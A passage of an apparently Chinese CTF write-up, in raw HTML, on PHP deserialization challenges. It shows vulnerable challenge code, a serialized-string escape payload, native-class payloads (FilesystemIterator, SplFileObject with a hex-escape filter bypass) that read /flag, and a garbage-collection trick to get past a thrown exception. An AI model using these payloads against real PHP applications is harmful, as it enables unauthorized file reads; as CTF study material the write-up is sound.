class=\"variable\">$data</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;<span class=\"class\"><span class=\"keyword\">class</span> = &quot;<span class=\"title\">error</span>&quot;;</span></span><br><span class=\"line\"><span class=\"class\">        $<span class=\"title\">this</span>-&gt;<span class=\"title\">data</span> = &quot;<span class=\"title\">hacker</span>&quot;;</span></span><br><span class=\"line\"><span class=\"class\">    &#125;</span></span><br><span class=\"line\"><span class=\"class\">    <span class=\"title\">public</span> <span class=\"title\">function</span> <span class=\"title\">__destruct</span>()</span></span><br><span class=\"line\"><span class=\"class\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"keyword\">new</span> <span class=\"variable language_\">$this</span>-&gt;<span class=\"class\"><span class=\"keyword\">class</span>($<span class=\"title\">this</span>-&gt;<span class=\"title\">data</span>);</span></span><br><span class=\"line\"><span class=\"class\">    &#125;</span></span><br><span class=\"line\"><span class=\"class\">&#125;</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"title\">class</span> <span class=\"title\">error</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$OTL</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;OTL = <span class=\"variable\">$OTL</span>;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> (<span class=\"string\">&quot;hello &quot;</span>.<span class=\"variable language_\">$this</span>-&gt;OTL);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">escape</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span> = <span class=\"string\">&#x27;OTL&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$phone</span> = <span class=\"string\">&#x27;123666&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$email</span> = <span class=\"string\">&#x27;sweet@OTL.com&#x27;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">abscond</span>(<span class=\"params\"><span class=\"variable\">$string</span></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"variable\">$filter</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;NSS&#x27;</span>, <span class=\"string\">&#x27;CTF&#x27;</span>, <span class=\"string\">&#x27;OTL_QAQ&#x27;</span>, <span class=\"string\">&#x27;hello&#x27;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$filter</span> = <span class=\"string\">&#x27;/&#x27;</span> . <span class=\"title function_ invoke__\">implode</span>(<span class=\"string\">&#x27;|&#x27;</span>, <span class=\"variable\">$filter</span>) . <span class=\"string\">&#x27;/i&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"variable\">$filter</span>, <span class=\"string\">&#x27;hacker&#x27;</span>, <span class=\"variable\">$string</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;cata&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/object/i&#x27;</span>,<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;cata&#x27;</span>]))&#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;cata&#x27;</span>]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$cc</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">catalogue</span>();</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$cc</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;name&#x27;</span>])&amp;&amp;<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;phone&#x27;</span>])&amp;&amp;<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;email&#x27;</span>]))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/flag/i&quot;</span>,<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;email&#x27;</span>]))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&quot;nonono,you can not do that!&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"variable\">$abscond</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">escape</span>();</span><br><span class=\"line\">        <span class=\"variable\">$abscond</span>-&gt;name = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;name&#x27;</span>];</span><br><span class=\"line\">        <span class=\"variable\">$abscond</span>-&gt;phone = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;phone&#x27;</span>];</span><br><span class=\"line\">        <span class=\"variable\">$abscond</span>-&gt;email = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;email&#x27;</span>];</span><br><span class=\"line\">        <span class=\"variable\">$abscond</span> = <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$abscond</span>);</span><br><span class=\"line\">        <span class=\"variable\">$escape</span> = <span class=\"title function_ invoke__\">get_object_vars</span>(<span class=\"title function_ invoke__\">unserialize</span>(<span class=\"title function_ invoke__\">abscond</span>(<span class=\"variable\">$abscond</span>)));</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">is_array</span>(<span class=\"variable\">$escape</span>[<span class=\"string\">&#x27;phone&#x27;</span>]))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$escape</span>[<span class=\"string\">&#x27;email&#x27;</span>]));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;I&#x27;m sorry to tell you that you are wrong&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span> </span><br></pre></td></tr></table></figure>\n\n<h3 id=\"解法一\"><a href=\"#解法一\" class=\"headerlink\" title=\"解法一\"></a>解法一</h3><h4 id=\"序列化字符串逃逸\"><a href=\"#序列化字符串逃逸\" class=\"headerlink\" title=\"序列化字符串逃逸\"></a>序列化字符串逃逸</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$escape</span>[<span class=\"string\">&#x27;email&#x27;</span>]));</span><br></pre></td></tr></table></figure>\n\n<p>可以知道是让<strong>email的值为flag文件</strong></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/flag/i&quot;</span>,<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;email&#x27;</span>]))</span><br></pre></td></tr></table></figure>\n\n<p>需要绕过正则判断</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">abscond</span>(<span class=\"params\"><span class=\"variable\">$string</span></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"variable\">$filter</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;NSS&#x27;</span>, <span class=\"string\">&#x27;CTF&#x27;</span>, <span class=\"string\">&#x27;OTL_QAQ&#x27;</span>, <span class=\"string\">&#x27;hello&#x27;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$filter</span> = <span class=\"string\">&#x27;/&#x27;</span> . <span class=\"title function_ invoke__\">implode</span>(<span class=\"string\">&#x27;|&#x27;</span>, <span class=\"variable\">$filter</span>) . <span class=\"string\">&#x27;/i&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"variable\">$filter</span>, <span class=\"string\">&#x27;hacker&#x27;</span>, <span class=\"variable\">$string</span>);</span><br></pre></td></tr></table></figure>\n\n<p>看到这里的时候就知道是字符串逃逸了，这里我选择了<strong>字符串增多逃逸</strong></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">escape</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span> = <span class=\"string\">&#x27;OTL&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$phone</span> = [<span class=\"string\">&#x27;123&#x27;</span>, <span class=\"string\">&#x27;666&#x27;</span>];  <span class=\"comment\">// 改为数组</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$email</span> = <span class=\"string\">&#x27;/flag&#x27;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$es</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">escape</span>();</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$es</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"><span class=\"comment\">//O:6:&quot;escape&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;OTL&quot;;s:5:&quot;phone&quot;;a:2:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;666&quot;;&#125;s:5:&quot;email&quot;;s:5:&quot;/flag&quot;;&#125;</span></span><br></pre></td></tr></table></figure>\n\n<p><code>&quot;;s:5:&quot;phone&quot;;a:2:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;666&quot;;&#125;s:5:&quot;email&quot;;s:5:&quot;/flag&quot;;&#125;</code>是目标字符串长度73</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a=<span class=\"string\">&#x27;hello&#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(a*<span class=\"number\">73</span>)</span><br></pre></td></tr></table></figure>\n\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET:</span><br><span class=\"line\">?cata=1</span><br><span class=\"line\"></span><br><span class=\"line\">POST:</span><br><span class=\"line\">name=hellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohello&quot;;s:5:&quot;phone&quot;;a:2:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;666&quot;;&#125;s:5:&quot;email&quot;;s:5:&quot;/flag&quot;;&#125;&amp;phone[]=1&amp;email=1</span><br></pre></td></tr></table></figure>\n\n<p>这种解法与<code>class catalogue</code>关系不大所以cata随便赋值即可</p>\n<h3 id=\"解法二\"><a href=\"#解法二\" class=\"headerlink\" title=\"解法二\"></a>解法二</h3><h4 id=\"通过php原生类来读取文件\"><a href=\"#通过php原生类来读取文件\" class=\"headerlink\" title=\"通过php原生类来读取文件\"></a>通过php原生类来读取文件</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">catalogue</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$class</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$data</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;<span class=\"class\"><span class=\"keyword\">class</span> = &quot;<span class=\"title\">error</span>&quot;;</span></span><br><span class=\"line\"><span class=\"class\">        $<span class=\"title\">this</span>-&gt;<span class=\"title\">data</span> = &quot;<span class=\"title\">hacker</span>&quot;;</span></span><br><span class=\"line\"><span class=\"class\">    &#125;</span></span><br><span class=\"line\"><span class=\"class\">    <span class=\"title\">public</span> <span class=\"title\">function</span> <span class=\"title\">__destruct</span>()</span></span><br><span class=\"line\"><span class=\"class\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"keyword\">new</span> <span class=\"variable language_\">$this</span>-&gt;<span class=\"class\"><span class=\"keyword\">class</span>($<span class=\"title\">this</span>-&gt;<span class=\"title\">data</span>);</span></span><br><span class=\"line\"><span class=\"class\">    &#125;</span></span><br><span class=\"line\"><span class=\"class\">&#125;</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;cata&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/object/i&#x27;</span>,<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;cata&#x27;</span>]))&#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;cata&#x27;</span>]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$cc</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">catalogue</span>();</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$cc</span>));</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>主要用到这两部分</p>\n<p><code>echo new $this-&gt;class($this-&gt;data);</code></p>\n<p>看到这里就可以知道将</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">catalogue</span> </span>&#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"variable\">$class</span> = <span class=\"string\">&#x27;FilesystemIterator&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"variable\">$data</span> = <span class=\"string\">&#x27;glob:///f*&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"string\">&quot;Class: &quot;</span> . <span class=\"variable language_\">$this</span>-&gt;<span class=\"class\"><span class=\"keyword\">class</span> . &quot;, <span class=\"title\">Data</span>: &quot; . $<span class=\"title\">this</span>-&gt;<span class=\"title\">data</span>;</span></span><br><span class=\"line\"><span class=\"class\">&#125;</span></span><br><span class=\"line\"><span class=\"class\">&#125;</span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\">$<span class=\"title\">ca</span> = <span class=\"title\">new</span> <span class=\"title\">catalogue</span>();</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"title\">echo</span> <span class=\"title\">serialize</span>($<span class=\"title\">ca</span>); </span></span><br><span class=\"line\"><span class=\"class\">// <span class=\"title\">O</span>:9:&quot;<span class=\"title\">catalogue</span>&quot;:2:</span>&#123;s:<span class=\"number\">5</span>:<span class=\"string\">&quot;class&quot;</span>;s:<span class=\"number\">18</span>:<span class=\"string\">&quot;FilesystemIterator&quot;</span>;s:<span class=\"number\">4</span>:<span class=\"string\">&quot;data&quot;</span>;s:<span class=\"number\">10</span>:<span class=\"string\">&quot;glob:///f*&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>通过这个查看文件名，看到flag</p>\n<h4 id=\"在通过SplFileObject读取文件内容\"><a href=\"#在通过SplFileObject读取文件内容\" class=\"headerlink\" title=\"在通过SplFileObject读取文件内容\"></a>在通过<strong>SplFileObject读取文件内容</strong></h4><p><code>O:9:&quot;catalogue&quot;:2:&#123;s:5:&quot;class&quot;;s:13:&quot;SplFileObject&quot;;s:4:&quot;data&quot;;s:5:&quot;/flag&quot;;&#125;</code></p>\n<p>由于<code>!preg_match(&#39;/object/i&#39;）</code></p>\n<h4 id=\"手动改链子\"><a href=\"#手动改链子\" class=\"headerlink\" title=\"手动改链子\"></a>手动改链子</h4><blockquote>\n<p>在序列化链子中 S可以识别16进制字符，可以通过这种方式修改链子</p>\n</blockquote>\n<p><code>O:9:&quot;catalogue&quot;:2:&#123;s:5:&quot;class&quot;;S:13:&quot;SplFileO\\62ject&quot;;s:4:&quot;data&quot;;s:5:&quot;/flag&quot;;&#125;</code></p>\n<blockquote>\n<p>\\62是b的ascii形式 </p>\n</blockquote>\n<p>直接读取flag</p>\n<h2 id=\"异常抛出绕过\"><a href=\"#异常抛出绕过\" class=\"headerlink\" title=\"异常抛出绕过\"></a>异常抛出绕过</h2><h3 id=\"ezpop\"><a href=\"#ezpop\" class=\"headerlink\" title=\"ezpop\"></a>ezpop</h3><p><a href=\"https://developer.aliyun.com/article/1161068\">https://developer.aliyun.com/article/1161068</a></p>\n<p><a href=\"https://blog.csdn.net/qq_45619909/article/details/122803600\">https://blog.csdn.net/qq_45619909/article/details/122803600</a></p>\n<h3 id=\"GC（垃圾回收）\"><a href=\"#GC（垃圾回收）\" class=\"headerlink\" title=\"GC（垃圾回收）\"></a><strong>GC</strong>（垃圾回收）</h3><p>在PHP中，使用<code>引用计数</code>和<code>回收周期</code>来自动管理内存对象的，当一个变量被设置为<code>NULL</code>，或者没有任何指针指向</p>\n<p>时，它就会被变成垃圾，被<code>GC</code>机制自动回收掉</p>\n<p><code>zval</code>的变量容器</p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%931/image-20240508203842897.png\" alt=\"image-20240508203842897\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"string\">&quot;new string&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$b</span> =&amp;<span class=\"variable\">$a</span>;</span><br><span class=\"line\"><span class=\"variable\">$c</span> =&amp;<span class=\"variable\">$b</span>;</span><br><span class=\"line\"><span class=\"title function_ invoke__\">xdebug_debug_zval</span>(<span class=\"string\">&#x27;a&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">unset</span>(<span class=\"variable\">$b</span>,<span class=\"variable\">$c</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">xdebug_debug_zval</span>(<span class=\"string\">&#x27;a&#x27;</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>引用<code>$a</code>的变量<code>$b</code>和<code>$c</code>都被<code>unset</code>了，所以这里的<code>is_ref</code>应该是<code>false</code>，也是因为<code>unset</code>，这里的<code>refcount</code>应该从<code>3</code>变成了<code>1</code>，接下来验证一下</p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%931/image-20240508204054662.png\" alt=\"image-20240508204054662\"></p>\n<h4 id=\"CG与反序列化的利用\"><a href=\"#CG与反序列化的利用\" class=\"headerlink\" title=\"CG与反序列化的利用\"></a>CG与反序列化的利用</h4><p>__destruct（<a href=\"https://so.csdn.net/so/search?q=%E6%9E%90%E6%9E%84%E5%87%BD%E6%95%B0&spm=1001.2101.3001.7020\">析构函数</a>）当某个对象成为垃圾或者当对象被显式销毁时执行销毁</p>\n<p>执行<code>__destruct</code>方法，就得绕过这个<code>throw new Exception</code>。因为<code>__destruct</code>方法是在该对象被回收时调用，而exception会<strong>中断该进程对该对象的销毁</strong></p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%931/image-20240508204242068.png\" alt=\"image-20240508204242068\"></p>\n<p>a:2:{i:<strong>0</strong>;O:1:”B”:0:{}i:<strong>1</strong>;i:0;}</p>\n<p>改为</p>\n<p>a:2:{i:<strong>0</strong>;O:1:”B”:0:{}i:<strong>0</strong>;i:0;}</p>\n<p>即可触发GC</p>\n<p>发现只要索引相同，即可绕过<strong>异常抛出</strong></p>\n<p>a:{i:<strong>1</strong>;O:1:”B”:0:{}i:<strong>1</strong>;i:0;}</p>\n<p>具体了解 <strong>双递减漏洞</strong></p>\n<p>漏洞报告如下（CVE-2016-5771）： <a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5771\">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5771</a> 。</p>\n<p><a href=\"https://www.anquanke.com/post/id/149424\">https://www.anquanke.com/post/id/149424</a></p>\n<p>知道这两者，即可攻破该题目</p>\n<h4 id=\"利用PHP垃圾回收机制构造pop\"><a href=\"#利用PHP垃圾回收机制构造pop\" class=\"headerlink\" title=\"利用PHP垃圾回收机制构造pop\"></a>利用PHP垃圾回收机制构造pop</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">AAA</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$s</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$a</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">BBB</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$c</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$d</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">CCC</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$c</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$c</span>=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">CCC</span>();</span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">AAA</span>();</span><br><span class=\"line\"><span class=\"variable\">$b</span>=<span class=\"keyword\">new</span> BBB;</span><br><span class=\"line\"><span class=\"variable\">$a</span>-&gt;s=<span class=\"variable\">$b</span>;</span><br><span class=\"line\"><span class=\"variable\">$c</span>-&gt;c=<span class=\"variable\">$a</span>;</span><br><span class=\"line\"><span class=\"variable\">$d</span>=<span class=\"keyword\">array</span>(<span class=\"variable\">$c</span>,<span class=\"number\">1</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$d</span>);</span><br></pre></td></tr></table></figure>\n\n<p>输出</p>\n<p>a:2:{i:0;O:3:”CCC”:1:{s:1:”c”;O:3:”AAA”:2:{s:1:”s”;O:3:”BBB”:2:{s:1:”c”;N;s:1:”d”;N;}s:1:”a”;N;}}i:<strong>1</strong>;i:1;}</p>\n<p>再改为</p>\n<p>a:2:{i:0;O:3:”CCC”:1:{s:1:”c”;O:3:”AAA”:2:{s:1:”s”;O:3:”BBB”:2:{s:1:”c”;N;s:1:”d”;N;}s:1:”a”;N;}}i:<strong>0</strong>;i:1;}</p>\n<p>即可绕过</p>\n<h4 id=\"动态函数执行语句\"><a href=\"#动态函数执行语句\" class=\"headerlink\" title=\"动态函数执行语句\"></a>动态函数执行语句</h4><p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%931/image-20240509153322177.png\" alt=\"image-20240509153322177\"></p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%931/image-20240509153314541.png\"></p>\n<p>可以发现在动态执行函数语句构造完成之后，再<strong>追加无关参数不影响命令执行</strong></p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%931/image-20240509152953542.png\" alt=\"image-20240509152953542\"></p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%931/image-20240509153022676.png\" alt=\"image-20240509153022676\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span 